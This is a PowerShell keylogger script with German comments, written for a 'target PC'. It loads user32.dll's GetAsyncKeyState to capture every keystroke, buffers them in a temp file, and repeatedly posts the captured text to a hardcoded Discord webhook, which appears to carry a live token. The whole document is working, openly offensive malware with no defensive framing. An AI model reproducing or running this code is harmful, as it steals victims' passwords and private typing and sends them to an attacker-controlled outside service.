$webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"

# 2. START-MELDUNG (Damit du weißt, dass es läuft)
$startMsg = @{ content = "✅ Keylogger auf dem Ziel-PC gestartet!" } | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $startMsg -ContentType "application/json"

$LogPath = "$env:TEMP\log.txt"
if (Test-Path $LogPath) { Remove-Item $LogPath } # Alten Log löschen

# 3. DIE SCHNITTSTELLE ZUR TASTATUR
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$lastKeys = @{} # Speicher für gedrückte Tasten (Tastensperre)

# 4. DER HAUPT-LOOP
while ($true) {
    Start-Sleep -Milliseconds 10 # CPU entlasten
    
    # Wir prüfen die Tasten von 8 (Backspace) bis 190 (Punkt/Sonderzeichen)
    for ($i = 8; $i -le 190; $i++) {
        $state = [Keylogger]::GetAsyncKeyState($i)
        
        # Ist die Taste gerade gedrückt?
        if ($state -and 0x8000) {
            # Nur registrieren, wenn sie vorher NICHT gedrückt war
            if (-not $lastKeys[$i]) {
                $lastKeys[$i] = $true
                
                # Nur Buchstaben, Zahlen und Leerzeichen loggen (verhindert viele Quadrate)
                if (($i -ge 48 -and $i -le 90) -or ($i -eq 32)) {
                    $key = [char]$i
                    $key | Out-File -FilePath $LogPath -Append -NoNewline
                }
                # Sonderfall: Enter-Taste
                elseif ($i -eq 13) {
                    " [ENTER] " | Out-File -FilePath $LogPath -Append -NoNewline
                }
            }
        } 
        else {
            # Taste wurde losgelassen, wieder freigeben
            $lastKeys[$i] = $false
        }
    }

    # 5. DATEN AN DISCORD SENDEN (alle 20 Zeichen)
    if (Test-Path $LogPath) {
        if ((Get-Item $LogPath).Length -gt 20) {
            $content = Get-Content $LogPath -Raw
            $payload = @{ content = "⌨️ Getippt: $content" } | ConvertTo-Json
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                Clear-Content $LogPath
            } catch {
                # Falls Discord blockt, warten wir kurz
                Start-Sleep -Seconds 5
            }
        }
    }
}
